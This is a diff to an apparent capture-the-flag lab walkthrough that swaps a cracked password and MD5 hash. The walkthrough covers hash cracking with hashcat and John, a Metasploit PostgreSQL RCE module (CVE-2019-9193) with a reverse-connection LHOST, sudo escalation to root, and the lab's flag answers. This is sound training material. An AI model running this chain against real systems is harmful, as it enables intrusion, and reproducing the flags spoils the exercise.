@@ -13,8 +13,8 @@ nmap scan
         → MySQL dump → Flag 3 (internal_flags table)
           → SSH private keys (charlie works)
             → SSH as charlie → Flag 4 (~/flag.txt) + hash hint
-              → crack MD5 hash → redteam2024
-                → psql pgadmin:redteam2024
+              → crack MD5 hash → sunshine
+                → psql pgadmin:sunshine
                   → Metasploit CVE-2019-9193 RCE → Flag 5 (/var/lib/postgresql/flag.txt)
                     → sudo /bin/bash → root → Flag 6 (/root/root_flag.txt)
 ```
@@ -120,7 +120,7 @@ ssh -i charlie.key charlie@<TARGET_IP>
 
 **Files in charlie's home:**
 - `flag.txt` → **Flag 4:** `ECOM{ssh_k3y_fr0m_db_n1c3_w0rk}`
-- `notes.txt` → Contains MD5 hash: `d5961b48a4c9b57fa289155b3e64620a` + hint about pgadmin on port 5432
+- `notes.txt` → Contains MD5 hash: `0571749e2ac330a7455809c6b0e7af90` + hint about pgadmin on port 5432
 
 ---
 
@@ -136,7 +136,7 @@ hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
 # Or with John
 john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 
-# Password: redteam2024
+# Password: sunshine
 ```
 
 ---
@@ -154,7 +154,7 @@ msfconsole
 use exploit/multi/postgres/postgres_copy_from_program_cmd_exec
 set RHOSTS <TARGET_IP>
 set USERNAME pgadmin
-set PASSWORD redteam2024
+set PASSWORD sunshine
 set LHOST <YOUR_KALI_IP>
 run
 ```
